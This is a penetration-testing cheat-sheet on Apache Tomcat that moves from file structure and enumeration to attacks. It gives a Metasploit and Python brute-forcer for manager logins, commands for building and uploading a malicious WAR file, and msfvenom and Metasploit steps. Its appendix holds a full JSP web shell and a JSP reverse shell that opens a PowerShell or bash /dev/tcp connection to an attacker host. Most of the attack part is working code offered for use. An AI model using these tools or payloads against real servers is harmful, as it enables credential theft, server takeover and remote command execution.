### Content

- [Structure](#structure)
	- [tomcat-users.xml](#tomcat-users.xml)
	- [webapps](#webapps)
		- [web.xml](#web.xml)
- [Enumeration](#enumeration)
- [Attacks](#attacks)
	- [Login Brute Force](#login-brute-force)
	- [WAR File Upload](#war-file-upload)
		- [Crafted Script](#crafted-script)
		- [MSFvenom Script](#msfvenom-script)
		- [Metasploit Module](#metasploit-module)

---
### Structure

General folder structure of a Tomcat installation:

```PowerShell
├── bin  # Scripts and binaries needed to start and run a Tomcat server.
├── conf # Configuration files used by Tomcat. 
│   ├── catalina.policy
│   ├── catalina.properties
│   ├── context.xml
│   ├── tomcat-users.xml # User credentials and their assigned roles.
│   ├── tomcat-users.xsd
│   └── web.xml
├── lib  # JAR files needed for the correct functioning of Tomcat.
├── logs # Temp log files.
├── temp # Temp log files.
├── webapps # Default webroot of Tomcat and hosts all the applications.
│   ├── manager
│   │   ├── images
│   │   ├── META-INF
│   │   └── WEB-INF
|   |       └── web.xml
│   └── ROOT
│       └── WEB-INF
└── work # Acts as a cache and is used to store data during runtime.
    └── Catalina
        └── localhost
```

#### tomcat-users.xml

The `tomcat-users.xml` file is used to allow or disallow access to the `/manager` and `host-manager` admin pages.

```xml
<?xml version="1.0" encoding="UTF-8"?>

<SNIP>
  
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">
<!--
  By default, no user is included in the "manager-gui" role required
  to operate the "/manager/html" web application.  If you wish to use this app,
  you must define such a user - the username and password are arbitrary.

  Built-in Tomcat manager roles:
    - manager-gui    - allows access to the HTML GUI and the status pages
    - manager-script - allows access to the HTTP API and the status pages
    - manager-jmx    - allows access to the JMX proxy and the status pages
    - manager-status - allows access to the status pages only

  The users below are wrapped in a comment and are therefore ignored. If you
  wish to configure one or more of these users for use with the manager web
  application, do not forget to remove the <!.. ..> that surrounds them. You
  will also need to set the passwords to something appropriate.
-->

   
 <SNIP>
  
<!-- user manager can access only manager section -->
<role rolename="manager-gui" />
<user username="tomcat" password="tomcat" roles="manager-gui" />

<!-- user admin can access manager and admin section both -->
<role rolename="admin-gui" />
<user username="admin" password="admin" roles="manager-gui,admin-gui" />


</tomcat-users>
```

#### webapps

Each folder inside `webapps` is expected to have the following structure:

```PowerShell
webapps/APPLICATION_NAME
├── images
├── index.jsp
├── META-INF
│   └── context.xml
├── status.xsd
└── WEB-INF
    ├── jsp     # Stores Jakarta Server Pages (JSP) formerly known as JavaServer Pages
    |   └── admin.jsp
    └── web.xml # The most important file
    └── lib     # The libraries needed by that particular application.
    |    └── jdbc_drivers.jar
    └── classes # All compiled classes used by the application
        └── AdminServlet.class
```

##### web.xml

`WEB-INF/web.xml` is known as the deployment descriptor which stores information about the routes used by the application and the classes handling these routes, an example `web.xml` file:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>

<!DOCTYPE web-app PUBLIC "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN" "http://java.sun.com/dtd/web-app_2_3.dtd">

<web-app>
  <servlet>
    <servlet-name>AdminServlet</servlet-name>
    <servlet-class>com.kaka.api.AdminServlet</servlet-class>
  </servlet>

  <servlet-mapping>
    <servlet-name>AdminServlet</servlet-name>
    <url-pattern>/admin</url-pattern>
  </servlet-mapping>
</web-app>
```

The `web.xml` configuration above defines a new servlet named `AdminServlet` that is mapped to the class `com.kaka.api.AdminServlet`. The path on disk for the class defined above would be:

`classes/com/kaka/api/AdminServlet.class`

Also, a new servlet mapping is created to map requests to `/admin` with `AdminServlet`. This configuration will send any request received for `/admin` to the `AdminServlet.class` class for processing.

---
### Enumeration

Footprinting and Discovering tomcat web server can be done in various ways:

```bash
# If the server is operating behind a reverse proxy, requesting an invalid page should reveal the server and version.
curl 'http://FQDN/invalid'
# Or through the /docs page.
curl -s http://FQDN/docs/ | grep Tomcat 
```

Unless the tomcat has a known vulnerability, we'll typically want to look for the `/manager` and the `/host-manager` pages.

```bash
gobuster dir -u http://FQDN/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt 
```

---
### Attacks
#### Login Brute Force

Using `auxiliary/scanner/http/tomcat_mgr_login` Metasploit module:

```bash
> set VHOST FQDN
> set RPORT 8180
> set stop_on_success true
> set rhosts 10.129.201.58
> run
```

Or using this [Tomcat Brute Force Custom Python Script](#tomcat-brute-force-custom-python-script)

```bash
$ ./script.py -U http://FQDN -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
```

#### WAR File Upload

- Tomcat installations provide a GUI interface to manage the application. `/manager/html`
- By default, only users assigned the `manager-gui` role are allowed to access the GUI.
- Valid manager can be used to upload a packaged Tomcat application (.WAR file). 
- A WAR, or Web Application Archive, is used to quickly deploy web applications and backup storage.
- The manager web app allows us to instantly deploy new applications by uploading WAR files.

<img src="/assets/tomcat_web_application_manager.png" style="display: block; margin:auto; height:500;">
If we created a `backup.war` archive that contains `cmd.jsp` that contains a web shell then uploaded and deployed it, inside the [webapps](#webapps) directory we will see: 

- `backup.war`
- `backup/` directory containing `cmd.jsp` and `META-INF` created after the application deploys.

Clicking on `Undeploy` will typically remove the uploaded WAR archive and the directory associated with the application.

###### Crafted Script

This [JSP web shell](#jsp-web-shell) or this [JSP Reverse Shell](#jsp-reverse-shell) can be placed within the archive which can be created manually using the ZIP utility. 

```bash
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r backup.war cmd.jsp

# To access the web shell after uploading and deploying
curl http://FQDN/backup/cmd.jsp?cmd=id
```

###### MSFvenom Script

We could also use `msfvenom` to generate a malicious WAR file.

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war

# The attacker machine will recieve a shell after deploying and visiting the page 
nc -lnvp 4443
```

###### Metasploit Module

We can automate the process using `multi/http/tomcat_mgr_upload` Metasploit module.

```bash
> set HttpUsername  <USERNAME>
> set HttpPassword  <PASSWORD>
> set RHOSTS <IP>
> set VHOST <VHost>
> set RPORT <PORT>
> set LHOST <IP>
> RUN
```









---
### Appendix

##### Tomcat Brute Force Custom Python Script

Inspired by: [this](https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce)

```python
#!/usr/bin/python

import requests
from termcolor import cprint
import argparse

parser = argparse.ArgumentParser(description = "Tomcat manager or host-manager credential bruteforcing")

parser.add_argument("-U", "--url", type = str, required = True, help = "URL to tomcat page")
parser.add_argument("-P", "--path", type = str, required = True, help = "manager or host-manager URI")
parser.add_argument("-u", "--usernames", type = str, required = True, help = "Users File")
parser.add_argument("-p", "--passwords", type = str, required = True, help = "Passwords Files")

args = parser.parse_args()

url = args.url
uri = args.path
users_file = args.usernames
passwords_file = args.passwords

new_url = url + uri
f_users = open(users_file, "rb")
f_pass = open(passwords_file, "rb")
usernames = [x.strip() for x in f_users]
passwords = [x.strip() for x in f_pass]

cprint("\n[+] Atacking.....", "red", attrs = ['bold'])

for u in usernames:
    for p in passwords:
        r = requests.get(new_url,auth = (u, p))

        if r.status_code == 200:
            cprint("\n[+] Success!!", "green", attrs = ['bold'])
            cprint("[+] Username : {}\n[+] Password : {}".format(u.decode(),p.decode()), "green", attrs = ['bold'])
            break
    if r.status_code == 200:
        break

if r.status_code != 200:
    cprint("\n[+] Failed!!", "red", attrs = ['bold'])
    cprint("[+] Could not Find the creds :( ", "red", attrs = ['bold'])
```

##### JSP web shell

```java
<%@ page import="java.util.*,java.io.*"%>
<%
//
// JSP_KIT
//
// cmd.jsp = Command Execution (unix)
//
// by: Unknown
// modified: 27/06/2003
//
%>
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "<BR>");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
                out.println(disr); 
                disr = dis.readLine(); 
                }
        }
%>
</pre>
</BODY></HTML>
```

##### JSP Reverse Shell

```java
<%@ page import="java.util.*,java.io.*"%>
<%
    String host = "ATTACKER_IP";
    int port = 1234;

    String[] cmd;
    String os = System.getProperty("os.name").toLowerCase();

    if (os.contains("win")) {
        cmd = new String[]{"cmd.exe", "/c",
            "powershell -NoP -NonI -W Hidden -Exec Bypass -Command " +
            "\"$client = New-Object System.Net.Sockets.TCPClient('" + host + "'," + port + ");" +
            "$stream = $client.GetStream();" +
            "[byte[]]$bytes = 0..65535|%{0};" +
            "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){" +
            "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);" +
            "$sendback = (iex $data 2>&1 | Out-String);" +
            "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';" +
            "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);" +
            "$stream.Write($sendbyte,0,$sendbyte.Length);" +
            "$stream.Flush()};" +
            "$client.Close()\""
        };
    } else {
        // Unix/Linux — bash reverse shell via /bin/bash
        cmd = new String[]{
            "/bin/bash", "-c",
            "bash -i >& /dev/tcp/" + host + "/" + port + " 0>&1"
        };
    }

    Process p = Runtime.getRuntime().exec(cmd);
    p.waitFor();
%>
```